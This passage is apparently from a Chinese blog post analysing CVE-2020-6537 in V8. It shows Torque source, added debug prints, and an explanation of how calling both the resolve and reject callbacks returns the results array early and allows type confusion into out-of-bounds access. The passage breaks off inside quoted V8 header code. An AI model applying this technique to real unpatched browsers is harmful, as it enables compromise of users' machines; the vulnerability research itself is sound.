<li>例如，第 0 个 Promise 的回调函数的 <code>identityHash</code> 为 1，第 1 个为 2，依此类推。</li>
</ul>
</li>
</ul>
<p><strong>5. 更新结果数组（核心逻辑）</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> valuesArray = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">JSArray</span>&gt;(</span><br><span class="line">    context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::kPromiseAllResolveElementValuesArraySlot]);</span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>valuesArray</code>**：存储所有 Promise 结果的数组（初始为空）。</li>
</ul>
<p><strong>6. 处理索引越界的情况</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (index &lt; valuesLength) &#123;</span><br><span class="line">  <span class="comment">// 索引在当前数组范围内，直接存储</span></span><br><span class="line">  elements.<span class="property">objects</span>[index] = updatedValue;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 索引超出当前数组范围，需要扩容</span></span><br><span class="line">  <span class="comment">// ... 扩容逻辑 ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>动态扩容<ul>
<li>当索引超出数组长度时，V8 会创建新的 <code>FixedArray</code>，复制旧元素，并设置新值。</li>
<li>这确保了结果数组始终能容纳所有 Promise 的结果，无论解析顺序如何。</li>
</ul>
</li>
</ul>
<p><strong>7. 计数器更新与最终结果处理</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> remainingElementsCount =</span><br><span class="line">    <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">Smi</span>&gt;(context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::kPromiseAllResolveElementRemainingSlot]);</span><br><span class="line">remainingElementsCount = remainingElementsCount - <span class="number">1</span>;</span><br><span class="line">context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::kPromiseAllResolveElementRemainingSlot] = remainingElementsCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (remainingElementsCount == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> capability = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">PromiseCapability</span>&gt;(</span><br><span class="line">      context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::kPromiseAllResolveElementCapabilitySlot]);</span><br><span class="line">  <span class="keyword">const</span> resolve = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">JSAny</span>&gt;(capability.<span class="property">resolve</span>);</span><br><span class="line">  <span class="title class_">Call</span>(context, resolve, <span class="title class_">Undefined</span>, valuesArray);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>计数器逻辑<ul>
<li><code>remainingElementsCount</code> 初始为 Promise 总数。</li>
<li>每个 Promise 解析后，计数器减 1。</li>
<li>当计数器为 0 时，所有 Promise 已解析，调用 <code>resolve(valuesArray)</code> 返回最终结果。</li>
</ul>
</li>
</ul>
<h2 id="五、相关环境"><a href="#五、相关环境" class="headerlink" title="五、相关环境"></a>五、相关环境</h2><p>为了方便我们调试，我们在源码的关键部位加上打印调试信息</p>
<p>promise-all-element-closure.tq</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">let</span> remainingElementsCount =</span><br><span class="line">      <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">Smi</span>&gt;(context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">                                  kPromiseAllResolveElementRemainingSlot]);</span><br><span class="line">  remainingElementsCount = remainingElementsCount - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Print</span>(<span class="string">&quot;remainingElementsCount remain ----------------------------&gt;&quot;</span>);</span><br><span class="line">  <span class="title class_">Print</span>(remainingElementsCount);</span><br><span class="line"></span><br><span class="line">  context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">              kPromiseAllResolveElementRemainingSlot] = remainingElementsCount;</span><br><span class="line">  <span class="keyword">if</span> (remainingElementsCount == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> capability = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">PromiseCapability</span>&gt;(</span><br><span class="line">        context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">                    kPromiseAllResolveElementCapabilitySlot]);</span><br><span class="line">    <span class="keyword">const</span> resolve = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">JSAny</span>&gt;(capability.<span class="property">resolve</span>);</span><br><span class="line">    <span class="title class_">Print</span>(<span class="string">&quot;back to JS !!!!&quot;</span>);</span><br><span class="line">    <span class="title class_">Print</span>(valuesArray);</span><br><span class="line">    <span class="title class_">Call</span>(context, resolve, <span class="title class_">Undefined</span>, valuesArray);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Undefined</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check if we need to grow the [[ValuesArray]] to store &#123;value&#125; at &#123;index&#125;.</span></span><br><span class="line"><span class="keyword">const</span> valuesArray = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">JSArray</span>&gt;(</span><br><span class="line">    context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">                kPromiseAllResolveElementValuesArraySlot]);</span><br><span class="line"><span class="keyword">const</span> elements = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">FixedArray</span>&gt;(valuesArray.<span class="property">elements</span>);</span><br><span class="line"><span class="keyword">const</span> valuesLength = <span class="title class_">Convert</span>&lt;intptr&gt;(valuesArray.<span class="property">length</span>);</span><br><span class="line"><span class="keyword">if</span> (index &lt; valuesLength) &#123;</span><br><span class="line">  <span class="comment">// The &#123;index&#125; is in bounds of the &#123;values_array&#125;,</span></span><br><span class="line">  <span class="comment">// just store the &#123;value&#125; and continue.</span></span><br><span class="line">  <span class="title class_">Print</span>(<span class="string">&quot;elements---------------------------&gt;&quot;</span>);</span><br><span class="line">  <span class="title class_">Print</span>(elements);</span><br><span class="line">  <span class="title class_">Print</span>(<span class="string">&quot;updatedValue-----------------------&gt;&quot;</span>);</span><br><span class="line">  <span class="title class_">Print</span>(updatedValue);</span><br><span class="line">  elements.<span class="property">objects</span>[index] = updatedValue;</span><br><span class="line">  <span class="title class_">Print</span>(<span class="string">&quot;elements---------------------------&gt;&quot;</span>);</span><br><span class="line">  <span class="title class_">Print</span>(elements);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>

<p>promise-all.tq</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set remainingElementsCount.[[Value]] to</span></span><br><span class="line"><span class="comment">//     remainingElementsCount.[[Value]] + 1.</span></span><br><span class="line"><span class="keyword">const</span> remainingElementsCount = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">Smi</span>&gt;(</span><br><span class="line">    resolveElementContext[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">                              kPromiseAllResolveElementRemainingSlot]);</span><br><span class="line">resolveElementContext[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">                          kPromiseAllResolveElementRemainingSlot] =</span><br><span class="line">    remainingElementsCount + <span class="number">1</span>;</span><br><span class="line">    <span class="title class_">Print</span>(<span class="string">&quot;remainingElementsCount Count--------------------&gt;&quot;</span>);</span><br><span class="line">    <span class="title class_">Print</span>(remainingElementsCount+<span class="number">1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后再重新编译即可</p>
<h2 id="六、漏洞利用"><a href="#六、漏洞利用" class="headerlink" title="六、漏洞利用"></a>六、漏洞利用</h2><h3 id="漏洞解释"><a href="#漏洞解释" class="headerlink" title="漏洞解释"></a>漏洞解释</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ransitioning macro <span class="title class_">PromiseAllResolveElementClosure</span>&lt;<span class="attr">F</span>: type&gt;(</span><br><span class="line">    implicit <span class="attr">context</span>: <span class="title class_">Context</span>)(</span><br><span class="line">    <span class="attr">value</span>: <span class="title class_">JSAny</span>, <span class="attr">function</span>: <span class="title class_">JSFunction</span>, <span class="attr">wrapResultFunctor</span>: F): <span class="title class_">JSAny</span> &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">let</span> remainingElementsCount =</span><br><span class="line">      <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">Smi</span>&gt;(context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">                                  kPromiseAllResolveElementRemainingSlot]);</span><br><span class="line">  remainingElementsCount = remainingElementsCount - <span class="number">1</span>;       <span class="comment">// ---&gt; [1]</span></span><br><span class="line">  context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">              kPromiseAllResolveElementRemainingSlot] = remainingElementsCount;</span><br><span class="line">  <span class="keyword">if</span> (remainingElementsCount == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> capability = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">PromiseCapability</span>&gt;(</span><br><span class="line">        context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">                    kPromiseAllResolveElementCapabilitySlot]);</span><br><span class="line">    <span class="keyword">const</span> resolve = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">JSAny</span>&gt;(capability.<span class="property">resolve</span>);</span><br><span class="line">    <span class="title class_">Call</span>(context, resolve, <span class="title class_">Undefined</span>, valuesArray);          <span class="comment">// ---&gt; [2]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Undefined</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，函数会从resolveElementContext中读取出remainingElementsCount，减去1，然后再保存回去（代码[1]处）。当remainingElementsCount减少至0时，代表所有promise都处理完毕，那么函数就会将结果数组返回给用户（代码[2]处）。</p>
<p>正常而言，<code>resolveElementFun</code> 和<code>rejectElementFun</code> 这两个函数，最多只能有一个被调用，代表着这个promise是被resolve，还是被reject（promise不可能既resolve，同时又reject）。但是，通过一些回调手法，我们可以获得<code>resolveElementFun</code> 和<code>rejectElementFun</code> 这两个函数对象，从而有机会同时调用这两个函数。这将导致在处理一个promise对象时，<code>remainingElementsCount</code> 会被减去2次，于是进一步导致我们可以在并非所有promise都被处理完的情况下，提前拿到结果数组。此时，V8内部和我们都会持有<code>valuesArray</code> ，这就为类型混淆创造了机会。</p>
<p>所以我们可以先一步拿到返回的array，然而settled的过程<strong>仍在继续</strong>，这点可以通过调试得知，后面在remainingElementsCount等于0后会继续减为负数。</p>
<p>我们拿到array之后，可以改变array的map，从而在其之后的settled过程中达到类型混淆，比如我们可以将array从FixedArray类型变为NumberDictionary，如此一来最直观的一点就是。</p>
<p><img src="/picture%5CCVE-2020-6537%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%5C%E4%B8%8B%E8%BD%BD.webp" alt="下载"></p>
<p>可以看到如果仍按照未变类型之前的偏移去读写数据的话就会造成越界读写，这也是在消去checkmaps之后常用的越界手段。</p>
<p>类型转化的方法有slide上贴出的，arr[0x10000] &#x3D; 1 ，原因是对于FixedArray来说，其内嵌的对象数量有一定的限制，超过这个限制就会自然转化为NumberDictionary形式，同样也是为了节省空间的优化表现形式。</p>
<h3 id="FixedArray与NumberDictionary的内存结构对比"><a href="#FixedArray与NumberDictionary的内存结构对比" class="headerlink" title="FixedArray与NumberDictionary的内存结构对比"></a>FixedArray与NumberDictionary的内存结构对比</h3><p>来源\src\objects\fixed-array.tq</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@abstract</span><br><span class="line">@generateCppClass</span><br><span class="line">extern <span class="keyword">class</span> <span class="title class_">FixedArrayBase</span> <span class="keyword">extends</span> <span class="title class_ inherited__">HeapObject</span> &#123;</span><br><span class="line">  <span class="comment">// length of the array.</span></span><br><span class="line">  <span class="keyword">const</span> <span class="attr">length</span>: <span class="title class_">Smi</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@generateBodyDescriptor</span><br><span class="line">@generateCppClass</span><br><span class="line">extern <span class="keyword">class</span> <span class="title class_">FixedArray</span> <span class="keyword">extends</span> <span class="title class_ inherited__">FixedArrayBase</span> &#123;</span><br><span class="line">  objects[length]: <span class="title class_">Object</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>来源\src\builtins\base.tq</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extern <span class="keyword">class</span> <span class="title class_">HashTable</span> <span class="keyword">extends</span> <span class="title class_ inherited__">FixedArray</span> generates <span class="string">&#x27;TNode&lt;FixedArray&gt;&#x27;</span>;</span><br><span class="line">extern <span class="keyword">class</span> <span class="title class_">NumberDictionary</span> <span class="keyword">extends</span> <span class="title class_ inherited__">HashTable</span>;</span><br></pre></td></tr></table></figure>

<p>来源\src\objects\fixed-array.h</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FixedArray describes fixed-sized arrays with element type Object.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FixedArray</span></span><br><span class="line">    : public <span class="title class_">TorqueGeneratedFixedArray</span>&lt;<span class="title class_">FixedArray</span>, <span class="title class_">FixedArrayBase</span>&gt; &#123;</span><br><span class="line"> <span class="attr">public</span>:</span><br><span class="line">  <span class="comment">// Setter and getter for elements.</span></span><br><span class="line">  inline <span class="title class_">Object</span> <span class="title function_">get</span>(int index) <span class="keyword">const</span>;</span><br><span class="line">  inline <span class="title class_">Object</span> <span class="title function_">get</span>(<span class="keyword">const</span> <span class="title class_">Isolate</span>* isolate, int index) <span class="keyword">const</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> inline <span class="title class_">Handle</span>&lt;<span class="title class_">Object</span>&gt; <span class="title function_">get</span>(<span class="title class_">FixedArray</span> array, int index,</span><br><span class="line">                                   <span class="title class_">Isolate</span>* isolate);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Return a grown copy if the index is bigger than the array&#x27;s length.</span></span><br><span class="line">  <span class="variable constant_">V8_EXPORT_PRIVATE</span> <span class="keyword">static</span> <span class="title class_">Handle</span>&lt;<span class="title class_">FixedArray</span>&gt; <span class="title class_">SetAndGrow</span>(</span><br><span class="line">      <span class="title class_">Isolate</span>* isolate, <span class="title class_">Handle</span>&lt;<span class="title class_">FixedArray</span>&gt; array, int index,</span><br><span class="line">      <span class="title class_">Handle</span>&lt;<span class="title class_">Object</span>&gt; value);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Setter that uses write barrier.</span></span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set</span>(int index, <span class="title class_">Object</span> value);</span><br><span class="line">  inline bool <span class="title function_">is_the_hole</span>(<span class="title class_">Isolate</span>* isolate, int index);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Setter that doesn&#x27;t need write barrier.</span></span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set</span>(int index, <span class="title class_">Smi</span> value);</span><br><span class="line">  <span class="comment">// Setter with explicit barrier mode.</span></span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set</span>(int index, <span class="title class_">Object</span> value, <span class="title class_">WriteBarrierMode</span> mode);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Setters for frequently used oddballs located in old space.</span></span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set_undefined</span>(int index);</span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set_undefined</span>(<span class="title class_">Isolate</span>* isolate, int index);</span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set_null</span>(int index);</span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set_null</span>(<span class="title class_">Isolate</span>* isolate, int index);</span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set_the_hole</span>(int index);</span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set_the_hole</span>(<span class="title class_">Isolate</span>* isolate, int index);</span><br><span class="line"></span><br><span class="line">  inline <span class="title class_">ObjectSlot</span> <span class="title class_">GetFirstElementAddress</span>();</span><br><span class="line">  inline bool <span class="title class_">ContainsOnlySmisOrHoles</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Gives access to raw memory which stores the array&#x27;s data.</span></span><br><span class="line">  inline <span class="title class_">ObjectSlot</span> <span class="title function_">data_start</span>();</span><br><span class="line"></span><br><span class="line">  inline <span class="keyword">void</span> <span class="title class_">MoveElements</span>(<span class="title class_">Isolate</span>* isolate, int dst_index, int src_index,</span><br><span class="line">                           int len, <span class="title class_">WriteBarrierMode</span> mode);</span><br><span class="line"></span><br><span class="line">  inline <span class="keyword">void</span> <span class="title class_">CopyElements</span>(<span class="title class_">Isolate</span>* isolate, int dst_index, <span class="title class_">FixedArray</span> src,</span><br><span class="line">                           int src_index, int len, <span class="title class_">WriteBarrierMode</span> mode);</span><br><span class="line"></span><br><span class="line">  inline <span class="keyword">void</span> <span class="title class_">FillWithHoles</span>(int <span class="keyword">from</span>, int to);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Shrink the array and insert filler objects. &#123;new_length&#125; must be &gt; 0.</span></span><br><span class="line">  <span class="variable constant_">V8_EXPORT_PRIVATE</span> <span class="keyword">void</span> <span class="title class_">Shrink</span>(<span class="title class_">Isolate</span>* isolate, int new_length);</span><br><span class="line">  <span class="comment">// If &#123;new_length&#125; is 0, return the canonical empty FixedArray. Otherwise</span></span><br><span class="line">  <span class="comment">// like above.</span></span><br><span class="line">  <span class="keyword">static</span> <span class="title class_">Handle</span>&lt;<span class="title class_">FixedArray</span>&gt; <span class="title class_">ShrinkOrEmpty</span>(<span class="title class_">Isolate</span>* isolate,</span><br><span class="line">                                          <span class="title class_">Handle</span>&lt;<span class="title class_">FixedArray</span>&gt; array,</span><br><span class="line">                                          int new_length);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Copy a sub array from the receiver to dest.</span></span><br><span class="line">  <span class="variable constant_">V8_EXPORT_PRIVATE</span> <span class="keyword">void</span> <span class="title class_">CopyTo</span>(int pos, <span class="title class_">FixedArray</span> dest, int dest_pos,</span><br><span class="line">                                int len) <span class="keyword">const</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Garbage collection support.</span></span><br><span class="line">  <span class="keyword">static</span> constexpr int <span class="title class_">SizeFor</span>(int length) &#123;</span><br><span class="line">    <span class="keyword">return</span> kHeaderSize + length * kTaggedSize;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Code Generation support.</span></span><br><span class="line">  <span class="keyword">static</span> constexpr int <span class="title class_">OffsetOfElementAt</span>(int index) &#123;</span><br><span class="line">    <span class="title function_">STATIC_ASSERT</span>(kObjectsOffset == <span class="title class_">SizeFor</span>(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">SizeFor</span>(index);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Garbage collection support.</span></span><br><span class="line">  inline <span class="title class_">ObjectSlot</span> <span class="title class_">RawFieldOfElementAt</span>(int index);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Maximally allowed length of a FixedArray.</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> int kMaxLength = (kMaxSize - kHeaderSize) / kTaggedSize;</span><br><span class="line">  <span class="title function_">static_assert</span>(<span class="title class_">Internals</span>::<span class="title class_">IsValidSmi</span>(kMaxLength),</span><br><span class="line">                <span class="string">&quot;FixedArray maxLength not a Smi&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Maximally allowed length for regular (non large object space) object.</span></span><br><span class="line">  <span class="title function_">STATIC_ASSERT</span>(kMaxRegularHeapObjectSize &lt; kMaxSize);</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> int kMaxRegularLength =</span><br><span class="line">      (kMaxRegularHeapObjectSize - kHeaderSize) / kTaggedSize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Dispatched behavior.</span></span><br><span class="line">  <span class="title function_">DECL_PRINTER</span>(<span class="title class_">FixedArray</span>)</span><br><span class="line"></span><br><span class="line">  int <span class="title class_">AllocatedSize</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">BodyDescriptor</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> constexpr int kObjectsOffset = kHeaderSize;</span><br><span class="line"></span><br><span class="line"> <span class="attr">protected</span>:</span><br><span class="line">  <span class="comment">// Set operation on FixedArray without using write barriers. Can</span></span><br><span class="line">  <span class="comment">// only be used for storing old space objects or smis.</span></span><br><span class="line">  <span class="keyword">static</span> inline <span class="keyword">void</span> <span class="title class_">NoWriteBarrierSet</span>(<span class="title class_">FixedArray</span> array, int index,</span><br><span class="line">                                       <span class="title class_">Object</span> value);</span><br><span class="line"></span><br><span class="line"> <span class="attr">private</span>:</span><br><span class="line">  <span class="title function_">STATIC_ASSERT</span>(kHeaderSize == <span class="title class_">Internals</span>::kFixedArrayHeaderSize);</span><br><span class="line"></span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set_undefined</span>(<span class="title class_">ReadOnlyRoots</span> ro_roots, int index);</span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set_null</span>(<span class="title class_">ReadOnlyRoots</span> ro_roots, int index);</span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set_the_hole</span>(<span class="title class_">ReadOnlyRoots</span> ro_roots, int index);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">TQ_OBJECT_CONSTRUCTORS</span>(<span class="title class_">FixedArray</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>来源\src\objects\dictionary.h</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NumberDictionary</span></span><br><span class="line">    : public <span class="title class_">Dictionary</span>&lt;<span class="title class_">NumberDictionary</span>, <span class="title class_">NumberDictionaryShape</span>&gt; &#123;</span><br><span class="line"> <span class="attr">public</span>:</span><br><span class="line">  <span class="title function_">DECL_CAST</span>(<span class="title class_">NumberDictionary</span>)</span><br><span class="line">  <span class="title function_">DECL_PRINTER</span>(<span class="title class_">NumberDictionary</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Type specific at put (default NONE attributes is used when adding).</span></span><br><span class="line">  <span class="variable constant_">V8_WARN_UNUSED_RESULT</span> <span class="keyword">static</span> <span class="title class_">Handle</span>&lt;<span class="title class_">NumberDictionary</span>&gt; <span class="title class_">Set</span>(</span><br><span class="line">      <span class="title class_">Isolate</span>* isolate, <span class="title class_">Handle</span>&lt;<span class="title class_">NumberDictionary</span>&gt; dictionary, uint32_t key,</span><br><span class="line">      <span class="title class_">Handle</span>&lt;<span class="title class_">Object</span>&gt; value,</span><br><span class="line">      <span class="title class_">Handle</span>&lt;<span class="title class_">JSObject</span>&gt; dictionary_holder = <span class="title class_">Handle</span>&lt;<span class="title class_">JSObject</span>&gt;::<span class="title function_">null</span>(),</span><br><span class="line">      <span class="title class_">PropertyDetails</span> details = <span class="title class_">PropertyDetails</span>::<span class="title class_">Empty</span>());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> int kMaxNumberKeyIndex = kPrefixStartIndex;</span><br><span class="line">  <span class="keyword">void</span> <span class="title class_">UpdateMaxNumberKey</span>(uint32_t key, <span class="title 